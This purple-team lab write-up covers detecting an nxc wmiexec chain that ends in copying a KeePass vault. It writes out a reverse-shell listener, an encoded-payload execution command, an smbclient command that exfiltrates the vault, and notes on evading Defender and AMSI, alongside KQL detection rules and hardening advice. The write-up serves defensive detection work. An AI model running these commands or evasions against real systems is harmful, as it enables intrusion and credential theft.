# nxc wmiexec + KeePass Credential Exfiltration — Detection Chain Analysis
## Windows Server 2022 Privileged Workstation — Purple Team Lab (Vector 3)

**Date:** 2026-04-06  
**Platform:** Windows Server 2022 Standard Evaluation (WIN-ATTACK.lab2019.local)  
**Attacker:** Kali Linux — nxc (NetExec) v1.x  
**Defender:** ELK SIEM (Kibana 8.19.12), Sysmon, Winlogbeat, Windows Security Auditing  
**Prerequisite:** [Vector 2 writeup](./nxc-wmiexec-detection.md) — same evasion chain, extended with post-exploitation credential access.

> This is a detection engineering document. Payload internals and bypass mechanics are intentionally omitted. The focus is on what the telemetry looks like, where detection coverage exists, and where it ends.

---

## Threat Model

Assumed breach. Attacker has valid administrative credentials — Domain Admin is used here to simplify lab setup. The technique does not rely on Domain Admin specifically: any principal with remote execution rights to the target workstation can retrieve the vault once it is accessible. No exploit required.

Target: a privileged administrative workstation (WIN-ATTACK.lab2019.local) running Windows Server 2022. A domain administrator has logged in to perform maintenance and left KeePass running with the credential vault unlocked. No idle lock policy is enforced.

This is not a contrived scenario. Credential vaults are routinely present on jump hosts, management servers, and admin workstations. Administrators leave vaults open during maintenance windows. This lab collapses infrastructure roles into a single host to simplify demonstration of the detection chain.

KeePass is representative of locally accessible credential vaults — KeePass, Password Safe, browser stores, exported PAM secrets. The detection problem is tool-agnostic: the telemetry gap exists for any locally readable secret store once the host is compromised.

**The attacker does not need to find the vault. They just need to look.**

---

## Environment

| Host        | IP            | Role                            |
|-------------|---------------|---------------------------------|
| Kali        | 192.168.1.218 | Attacker                        |
| WIN-ATTACK  | 192.168.1.83  | Privileged workstation (target) |
| DC01        | 192.168.1.4   | Domain Controller               |
| ELK         | 192.168.1.250 | SIEM                            |

**WIN-ATTACK configuration:**
- Windows Server 2022 Standard Evaluation, Build 20348
- Domain joined: lab2019.local
- Defender: real-time protection On, cloud-delivered protection On
- Sysmon 15.20, SwiftOnSecurity config + custom NetworkConnect rule
- Winlogbeat 8.19.12 → ELK

---

## Evasion Analysis

Two independent layers working together. Neither alone is sufficient.

### Layer 1 — `--no-output` bypasses Defender's nxc signature

By default nxc wmiexec executes commands as:

```
cmd.exe /Q /c [command] 1> C:\windows\temp\[guid].txt 2>&1
```

Defender has named signatures for this exact pattern — `VirTool:Win32/SuspRemoteCmdCommand.*` fires on the `cmd.exe /Q /c` + output redirection construct.

`--no-output` removes the redirection entirely:

```
cmd.exe /Q /c [command]
```

No temp file. No signature match. The evasion is a flag in the help text.

**The key insight:** Defender's nxc signature targets the output capture mechanism — an operational convenience feature — not the execution primitive itself.

### Layer 2 — C# runspace executes payload outside standard AMSI instrumentation path

`--no-output` gets the binary running. A custom C# binary executes the payload via a programmatically created runspace — outside the standard PowerShell host process instrumentation path where AMSI content inspection is typically applied.

**Without the C# binary, `--no-output` alone is insufficient.** Both layers are required.

### Validated on Server 2022

This chain was previously validated on Windows Server 2019. This document confirms the same bypass holds on Server 2022 Build 20348 with Defender real-time protection and cloud-delivered protection both enabled.

---

## Attack Chain

### 1. Payload Pre-Staged

A custom C# binary (`getit1.exe`) and encoded PowerShell payload (`ld.ps1`) are resident in `C:\Windows\Tasks\` — a well-documented AppLocker bypass path. Pre-staging is assumed as part of the assumed breach model.

### 2. Encode Payload

```bash
[Kali] ENCODED=$(cat ld.ps1 | iconv -t UTF-16LE | base64 -w 0)
```

### 3. Start C2 Listener

```bash
[Kali] sudo ncat --ssl --ssl-key key.pem --ssl-cert cert.pem -lvnp 8443
```

### 4. Execute via nxc wmiexec

```bash
[Kali] nxc smb 192.168.1.83 -u administrator -p '<PASSWORD>' --no-output -x "C:\\Windows\\Tasks\\getit1.exe $ENCODED"
```

### 5. Shell Received

```
Ncat: Connection from 192.168.1.83
SHELL> whoami
lab2019\administrator
SHELL> hostname
WIN-ATTACK
```

### 6. Credential Vault Discovery

```
SHELL> tasklist | findstr -i keepass
KeePass.exe    4000 Console    1    4,456 K
```

KeePass running in Console session 1 — interactive desktop, vault open.

### 7. Credential Store Exfiltration

Administrative SMB shares (C$, ADMIN$) are enabled by default on domain-joined Windows systems and are commonly reachable from management networks. No special access, no additional tooling required.

```bash
[Kali] smbclient //192.168.1.83/C$ -U 'administrator%<PASSWORD>' \
  -c 'get "Users\Administrator.LAB2019\Documents\sysadminsecrets.kdbx" /tmp/sysadminsecrets.kdbx'
```

```
getting file \Users\Administrator.LAB2019\Documents\sysadminsecrets.kdbx
of size 2087
```

Credential vault is now on the attack box. Detection ends here.

---

## SIEM Telemetry

### Rules Fired

All five custom Kibana rules fired on WIN-ATTACK.lab2019.local:

| Rule | Event | Severity | Risk Score | Fired |
|---|---|---|---|---|
| Sysmon - Binary Execution from Windows Tasks | EID 1, Image path | High | 73 | ✅ |
| Sysmon - WMI Remote Process Execution | EID 1, ParentImage WmiPrvSE | High | 73 | ✅ |
| Sysmon - Outbound Network Connection from Windows Tasks Binary | EID 3, RuleName Tasks | High | 75 | ✅ |
| Sysmon - Unsigned Binary with Zeroed IMPHASH | EID 1, IMPHASH + Company | Medium | 50 | ✅ |
| Sysmon - Base64 Encoded Payload in CommandLine | EID 1, JAB* pattern | High | 70 | ✅ |

### Detection Coverage by Stage

| Stage | Data Source | Event | Rule | Status |
|---|---|---|---|---|
| WMI remote execution | Sysmon EID 1 | WmiPrvSE.exe → cmd.exe | WMI Remote Process Execution | ✅ Caught |
| Binary execution from Tasks | Sysmon EID 1 | getit1.exe Image path | Binary Execution from Windows Tasks | ✅ Caught |
| C2 callback | Sysmon EID 3 | getit1.exe → 192.168.1.218:8443 | Outbound Network Connection from Tasks | ✅ Caught |
| Unsigned binary | Sysmon EID 1 | IMPHASH zeroed, Company: - | Unsigned Binary with Zeroed IMPHASH | ✅ Caught |
| Encoded payload delivery | Sysmon EID 1 | JAB* in CommandLine | Base64 Encoded Payload in CommandLine | ✅ Caught |
| KeePass process enumeration | Sysmon EID 1 | tasklist execution | No dedicated rule | ⚠️ Data present, no alert |
| SMB credential vault access | Security EID 5145 | C$ share read | Admin Share Access — C$ via SMB | ✅ Caught |
| Offline credential access | — | — | — | ❌ Detection ends |

### The Blind Spot

The SIEM captures every stage of execution. It cannot observe what happens once the credential store leaves the host boundary.

At that point, the problem is no longer endpoint detection — it is data control.

---

## KQL Detection Rules

### Rule 1 — Binary Execution from Windows Tasks
```kql
event.provider: "Microsoft-Windows-Sysmon" AND
event.code: "1" AND
winlog.event_data.Image: *Windows\\Tasks*
```

### Rule 2 — WMI Remote Process Execution
```kql
event.provider: "Microsoft-Windows-Sysmon" AND
event.code: "1" AND
winlog.event_data.ParentImage: *WmiPrvSE.exe
```

### Rule 3 — Outbound Network Connection from Windows Tasks Binary
```kql
event.provider: "Microsoft-Windows-Sysmon" AND
event.code: "3" AND
winlog.event_data.RuleName: "Tasks"
```

### Rule 4 — Unsigned Binary with Zeroed IMPHASH
```kql
event.provider: "Microsoft-Windows-Sysmon" AND
event.code: "1" AND
winlog.event_data.Hashes: *IMPHASH=00000000000000000000000000000000* AND
winlog.event_data.Company: "-"
```

### Rule 5 — Base64 Encoded Payload in CommandLine
```kql
event.provider: "Microsoft-Windows-Sysmon" AND
event.code: "1" AND
winlog.event_data.CommandLine: *JAB*
```

---

## Defensive Recommendations

| Gap | Recommendation |
|---|---|
| Credential vault accessible post-compromise | Store vaults on dedicated PAM infrastructure, not workstations or servers with network exposure |
| No idle lock policy | Enforce auto-lock on session switch and after inactivity: Tools → Settings → Security |
| Administrative SMB shares reachable | Restrict C$ and ADMIN$ access via host-based firewall rules scoped to management subnets |
| Detection ends at exfil | Implement DLP controls on sensitive file extensions (.kdbx) at network egress |
| No alert on vault file access | Set SACL on .kdbx files — EID 4663 on read access provides pre-exfil detection opportunity |

---

## MITRE ATT&CK

| Technique | ID |
|---|---|
| Windows Management Instrumentation | T1047 |
| Command and Scripting Interpreter: PowerShell | T1059.001 |
| Execution from AppLocker Bypass Path | T1218 |
| Credentials from Password Stores | T1555 |
| Data from Local System | T1005 |
| Exfiltration Over SMB | T1048 |
| Lateral Movement: Remote Services | T1021 |

---

## Tools Used

| Tool | Purpose |
|---|---|
| nxc (NetExec) | Remote WMI execution |
| ncat (TLS) | Encrypted reverse shell listener |
| smbclient | Credential vault exfiltration |
| Sysmon 15.20 | Process and network telemetry |
| Winlogbeat 8.19.12 | Log shipping to ELK |
| Kibana 8.19.12 | SIEM alerting and rule analysis |

---
<img width="1715" height="917" alt="kibanarules" src="https://github.com/user-attachments/assets/90db4b52-5adb-4bc2-bec3-672cf0ba6397" />

<img width="1843" height="583" alt="kibanarules1" src="https://github.com/user-attachments/assets/303e2614-3ab5-45aa-bb01-8690f1cbca01" />

<img width="1002" height="591" alt="antiviruson" src="https://github.com/user-attachments/assets/1bd868dc-0c67-4d8f-8aa3-5bdc9df3dc60" />

<img width="1040" height="594" alt="kalipayloaddelivery" src="https://github.com/user-attachments/assets/fde0bcd4-8dc3-4bae-b4a8-853d6c2d85ae" />

<img width="1824" height="426" alt="keepasdbexfil" src="https://github.com/user-attachments/assets/83aa5af3-cc88-46b4-86e5-265af8e52efb" />

<img width="1046" height="457" alt="shelloutputscreenshot4" src="https://github.com/user-attachments/assets/8d3e2d40-8b0e-42e2-a02e-dab60c38f45f" />

<img width="878" height="767" alt="virusdefinitionstatus" src="https://github.com/user-attachments/assets/6adb4f97-ce88-4aa2-9346-373268a63498" />





*Lab environment. All credentials redacted. Do not use against systems you do not own or have explicit written permission to test.*
